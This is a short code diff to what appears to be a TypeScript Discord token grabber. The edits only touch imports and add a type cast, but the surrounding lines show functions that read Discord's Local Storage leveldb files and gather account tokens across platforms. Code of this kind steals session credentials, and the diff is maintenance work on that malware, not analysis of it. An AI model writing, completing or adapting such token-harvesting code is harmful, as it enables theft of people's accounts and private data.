@@ -1,5 +1,5 @@
-import fs from 'fs'
-import path from 'path'
+import * as fs from 'fs'
+import * as path from 'path'
 
 function findToken(tokenPath: string) {
   tokenPath += '\\Local Storage\\leveldb'
@@ -71,7 +71,7 @@ export function grabDiscordToken() {
 
   const tokens: { [key: string]: string[] } = {}
   for (const [platform, path] of Object.entries(paths)) {
-    const tokenList = findToken(path)
+    const tokenList = findToken(path as string)
     if (tokenList) {
       tokenList.forEach((token) => {
         if (tokens[platform] === undefined) tokens[platform] = []
